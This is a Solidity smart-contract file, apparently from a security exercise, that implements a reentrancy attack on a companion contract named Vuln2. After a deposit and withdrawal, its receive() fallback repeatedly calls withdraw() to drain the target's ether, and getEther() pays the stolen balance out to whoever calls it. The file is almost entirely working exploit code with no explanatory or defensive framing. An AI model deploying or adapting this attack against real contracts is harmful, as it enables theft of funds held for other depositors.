// SPDX-License-Identifier: UNLICENSED

pragma solidity >=0.8;


import "hardhat/console.sol";

import "./Vuln2.sol";



contract Exploit2 {

    address private owner;
    Vuln2 public vulnerableContract;

    constructor () payable {

        // запоминаем кто задеплоил эксплоит
        owner = msg.sender;
    }

    //Re entrancy Attack on Vuln2 
    receive() external payable {
        if (address(vulnerableContract).balance >= 5 ether) {
            vulnerableContract.withdraw(5 ether);
        }
    }

    modifier OnlyOwner () {
        require(msg.sender == owner, "OnlyOwner");
        _;
    }

    // Сюда нужно передать адрес нужного контракта Vuln2.
    function InitExploit2 (address addr) public payable OnlyOwner {
        vulnerableContract = Vuln2(addr);
        
    }
    
    //Re entrancy Attack on Vuln2 
    function attack1() public payable {
        vulnerableContract.deposit{value: 5 ether}();
        vulnerableContract.withdraw(5 ether);
        
    }
    

    function getEther() public {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }
}